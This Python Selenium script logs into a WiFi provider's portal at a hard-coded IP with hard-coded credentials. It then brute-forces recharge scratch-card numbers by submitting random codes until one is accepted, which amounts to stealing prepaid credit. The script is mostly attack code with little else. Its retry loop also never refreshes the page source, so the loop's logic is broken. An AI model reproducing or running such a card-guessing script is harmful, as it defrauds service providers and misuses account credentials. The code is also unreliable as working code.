import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys




class Wifi:

    src = ""
    text = "Card number is invalid."
    driver = ""
    finalScratchNumber = ""
    rechargePageUrl = ""

    letters = ['A','B','C','D','E','0','1','2','3','4','5','6','7','8','9']


    def SCRATCH_NUMBER_GENERATOR(self):

        for number in range(10):
            self.finalScratchNumber += random.choice(self.letters)

        return self.finalScratchNumber

    

    def AUTOFILL_CREDENTIAL(self):

        path = "C:\Program Files (x86)\chromedriver.exe"
        self.driver = webdriver.Chrome(path)

        self.driver.get("http://119.148.40.171")


        # fillup username, password and click Login button 
        username = self.driver.find_element_by_name("username").send_keys("pn1629")
        password = self.driver.find_element_by_name("password").send_keys("pn1629")
        self.driver.find_element_by_class_name("login100-form-btn").click()


        # go to Recharge Page
        self.driver.find_element_by_link_text("Recharge").click()


        # create random number and click on Recharge button
        self.driver.find_element_by_name("card_no").send_keys(self.SCRATCH_NUMBER_GENERATOR())
        self.finalScratchNumber = ""
        self.driver.find_element_by_css_selector("input[value=Recharge]").click()
    

        self.src = self.driver.page_source
        

    

    # loop until Card number get valid
    def INVALID_CARD(self):

        while True:
            if self.text in self.src:
                self.driver.find_element_by_name("card_no").clear()
                self.driver.find_element_by_name("card_no").send_keys(self.SCRATCH_NUMBER_GENERATOR())
                self.finalScratchNumber = ""
                self.driver.find_element_by_css_selector("input[value=Recharge]").click()
            
            else:
                break


    
    # Control all Function
    def MAIN_FUNCTION(self):

        self.AUTOFILL_CREDENTIAL()
        self.INVALID_CARD()



        
m = Wifi()
print(m.MAIN_FUNCTION())
